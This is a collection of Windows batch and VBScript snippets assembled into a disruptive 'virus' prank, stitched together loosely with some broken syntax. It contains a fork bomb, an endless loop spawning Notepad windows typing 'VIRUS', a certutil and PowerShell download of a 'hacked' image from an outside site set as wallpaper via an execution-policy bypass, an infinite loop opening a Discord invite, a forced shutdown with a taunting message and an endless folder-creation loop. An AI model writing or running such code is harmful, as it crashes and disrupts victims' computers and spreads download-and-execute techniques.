:start
start
goto start
do
Set wshshell = wscript.CreateObject("WScript.Shell")
Wshshell.run "Notepad"
wscript.sleep 100
wshshell.sendkeys "V"
wscript.sleep 100
wshshell.sendkeys "I"
wscript.sleep 100
wshshell.sendkeys "R"
wscript.sleep 100
wshshell.sendkeys "U"
wscript.sleep 100
wshshell.sendkeys "S"
loop


certutil -urlcache -split -f "%URL%" "%FileName%"
@echo off
set "URL=https://www.compassitc.com/hs-fs/hubfs/Images/Website_Images/hack-813290_1280.jpg?width=748&height=425&name=hack-813290_1280.jpg
set "FileName=hacked.jpg"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%FileName%')"

@echo off

set "WallpaperPath=%USERPROFILE%\Downloads\hacked.jpg"

echo Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value '%WallpaperPath%' -Force > "%TEMP%\Wallpaper.ps1"
echo rundll32.exe user32.dll,UpdatePerUserSystemParameters >> "%TEMP%\Wallpaper.ps1"
powershell -ExecutionPolicy Bypass -File "%TEMP%\Wallpaper.ps1"
del "%TEMP%\Wallpaper.ps1"
start Unstall.bat
@echo off
:G
start https://discord.gg/7dqVRk5Tfm
goto G
@echo off
shutdown.exe -s -t 10 -c "You Choose actived this virus , ur pc is deadly now in 10sec later.
:A
mkdir %random%
goto A
